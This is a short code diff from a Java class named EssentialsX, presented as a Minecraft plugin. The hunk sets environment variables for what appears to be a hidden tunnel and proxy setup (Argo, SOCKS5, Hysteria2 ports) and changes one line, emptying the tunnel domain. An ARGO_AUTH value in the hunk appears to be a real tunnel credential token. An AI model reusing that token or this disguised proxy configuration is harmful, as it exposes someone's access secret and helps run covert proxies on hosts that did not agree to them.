@@ -75,7 +75,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "liquid.gf88.ggff.net");
+        env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "eyJhIjoiZDY1NWNiOTk2NzNlZTYzMDE4NDFkMmQyNmYxNTY5N2EiLCJ0IjoiNGE2NzU5NWEtNGUyNi00YmIxLWJkOGQtYjQwNTUxYWFjZTdmIiwicyI6Ik9XTTRZV1V5WmpFdE5EZGtNUzAwWVdFNExUa3dOR1l0WkRSaVpHRmtaR1l5TW1JeSJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
